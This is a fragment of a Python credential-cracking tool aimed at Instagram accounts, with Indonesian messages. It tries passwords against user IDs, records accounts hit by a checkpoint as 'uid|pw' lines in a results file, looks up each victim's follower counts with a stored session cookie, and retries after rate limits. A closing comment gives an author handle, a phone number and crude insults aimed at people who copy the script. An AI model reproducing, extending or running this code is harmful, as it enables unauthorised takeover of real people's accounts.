							hikmat = requests.get(f'https://i.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()['graphql']['user']
							foll_cok = hikmat['edge_followed_by']['count']
							foll_cik = hikmat['edge_follow']['count']
						except (KeyError, IOError):
							foll_cok = ('-')
							foll_cik = ('-')
						except:pass
						x=f"{K2}status  : cp\n{K2} *--> {uid} • {pw}\n{K2}followers : {foll_cok}\n{K2}following : {foll_cik}"
						vprint(panel(x,style=f"{H3}"))
						self.cp.append(f"{uid}|{pw}")
						open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
						break
					elif 'Please wait' in str(response):
						print(f"{P} *-->{K} pakai mode pesawat 2 detik", end='\r');sleep(7);__main__(self, user, uid, pwx)
					else:
						continue
			self.kill +=1
			print(f"{P}*--> cracked {self.kill}/{str(len(user))} {K}Cp:-{len(self.cp)} {H}Ok:-{len(self.ok)}          ", end='\r')
		except (ConnectionError):
			print(f"{P}*-->{M} koneksi bermasalah               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
		except:__main__(self, user, uid, pwx)

if __name__=='__main__':
	os.system('git pull')
	menu()
	
'''

Apakah keren ngerekod script orang? 
gk keren broo soalnya gk ada berusaha tuh cuman bisa rekod doang gk bisa ngoding:v
mending ngocok aja goblok
@Author       : HikmatXD
@Facebook : HIKMAT XF
@Whastapp : 082115413282
@Coding      : ｐｙｔｈｏｎ 3
ｊａｎｇａｎ ｋｅｒａｓ ｍｅｒｅｃｏｄｅ ｓｃｒｉｐｔ ｋａｍｉ:) 
ｋｏｎｔｏｌ ｌｕ

'''
    
